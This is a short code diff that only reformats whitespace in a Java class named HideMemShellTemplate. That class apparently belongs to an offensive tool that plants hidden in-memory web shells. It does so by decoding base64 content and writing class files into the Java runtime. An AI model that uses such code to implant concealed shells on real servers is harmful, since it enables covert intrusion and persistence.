@@ -24,10 +24,10 @@ public class HideMemShellTemplate extends ClassLoader {
     }
 
     public static void writeClassFileToJRE(String className, String base64Content) throws Exception {
-        ByteArrayInputStream  bais = new ByteArrayInputStream(base64Decode(base64Content));
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64Decode(base64Content));
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        byte[]                bs   = new byte[4096];
-        int                   read;
+        byte[] bs = new byte[4096];
+        int read;
 
         while ((read = bais.read(bs)) != -1) {
             baos.write(bs, 0, read);
@@ -55,7 +55,7 @@ public class HideMemShellTemplate extends ClassLoader {
     }
 
     public static byte[] base64Decode(String bs) {
-        Class  base64;
+        Class base64;
         byte[] value = null;
         try {
             base64 = Class.forName("java.util.Base64");
